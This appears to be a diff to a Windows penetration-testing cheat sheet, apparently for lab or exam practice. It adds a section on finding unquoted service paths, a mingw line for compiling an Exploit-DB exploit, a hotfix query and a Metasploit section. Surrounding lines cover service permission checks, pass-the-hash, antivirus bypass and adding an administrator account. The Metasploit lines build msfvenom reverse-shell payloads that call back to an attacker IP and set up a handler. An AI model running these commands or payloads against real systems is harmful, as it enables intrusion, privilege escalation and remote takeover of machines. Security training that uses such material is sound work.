@@ -37,9 +37,12 @@ netsh firewall show config*
     List windows services
     *$ net start*
     *$ wmic service list brief*
-    Get permisions of all services. Services with full access from *BUILTIN\Users* can replace executable with malicious binary.
+    Get permissions of all services. Services with full access from *BUILTIN\Users* can replace executable with malicious binary.
     *$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
 $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"*
+
+    Find unqouted paths
+    *$ wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """*
 
     Pass The Hash allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a cleartext password.
     *$ pth-winexe -U hash //$ip cmd*
@@ -61,6 +64,8 @@ $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe 
 [+] relevant kbs [‘3164038’, ‘3163018’, ‘3163017’, ‘3161561’]
 [*] done*
 
+    Compile windows exploit in linux:
+    *$ i686-w64-mingw32-gcc 18176.c -lws2_32 -o 18176.exe*
 
 AV bypass
     Generating a mutated binary to bypass antiviruses
@@ -75,6 +80,8 @@ https://github.com/Jean13/Penetration_Testing/blob/master/Privilege_Escalation/w
 
 
 Update & exploits
+    Find installed paths:
+    *$ wmic qfe get Caption,Description,HotFixID,InstalledOn*
     *Exploit-DB Vuln Name             MS#         2K         XP      2003      2008    Vista 7
 271     Lsasrv.dll            MS04-011    SP2/3/4    SP0/1    -         -            -        -
 350     Util Manager          MS04-019    SP2/3/4    -        -         -            -        -
@@ -126,7 +133,19 @@ netsh firewall set service remotedesktop enable*
     *$ net user test 1234 /add
 $ net localgroup administrators test /add*
 
+Metasploit
+    *msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.11.0.123 -o meterpreter.php
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.123 -f asp -o shell.asp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
 
+msf > use exploit/multi/handler
+msf > set lport 1234
+msf > set lhost 10.11.0.123
+msf > set payload windows/shell/reverse_tcp
+or
+set PAYLOAD windows/meterpreter/reverse_tcp
+msf > run*
 
 Get proof
     *$ echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: & type "C:\Users\Administrator\Desktop\proof.txt" 2> nul & type "C:\Documents and Settings\Administrator\Desktop\proof.txt" 2> nul & type %USERPROFILE%\Desktop\proof.txt 2> null*
